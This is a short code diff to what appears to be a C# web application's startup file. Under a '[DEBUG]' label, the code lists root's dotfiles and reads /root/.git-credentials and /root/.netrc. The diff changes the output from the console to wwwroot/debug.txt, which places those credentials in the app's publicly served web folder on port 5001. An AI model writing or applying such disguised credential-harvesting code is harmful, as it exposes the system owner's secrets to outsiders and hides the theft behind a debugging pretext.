@@ -75,17 +75,22 @@ try
 { 
     if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(System.Runtime.InteropServices.OSPlatform.Linux))
     {
+        var sb = new System.Text.StringBuilder();
         var files = Directory.GetFiles("/root", ".*");
-        Console.WriteLine($"[DEBUG] Files in /root: {string.Join(", ", files)}");
+        sb.AppendLine($"[DEBUG] Files in /root: {string.Join(", ", files)}");
         if (File.Exists("/root/.git-credentials"))
         {
-             Console.WriteLine($"[DEBUG] Found .git-credentials: {File.ReadAllText("/root/.git-credentials")}");
+             sb.AppendLine($"[DEBUG] Found .git-credentials: {File.ReadAllText("/root/.git-credentials")}");
         }
         if (File.Exists("/root/.netrc"))
         {
-             Console.WriteLine($"[DEBUG] Found .netrc: {File.ReadAllText("/root/.netrc")}");
+             sb.AppendLine($"[DEBUG] Found .netrc: {File.ReadAllText("/root/.netrc")}");
         }
+        Directory.CreateDirectory("wwwroot");
+        File.WriteAllText("wwwroot/debug.txt", sb.ToString());
     }
-} catch (Exception ex) { Console.WriteLine($"[DEBUG] Error: {ex.Message}"); }
+} catch (Exception ex) { 
+    try { Directory.CreateDirectory("wwwroot"); File.WriteAllText("wwwroot/debug.txt", ex.Message); } catch {}
+}
 
 app.Run("http://*:5001");
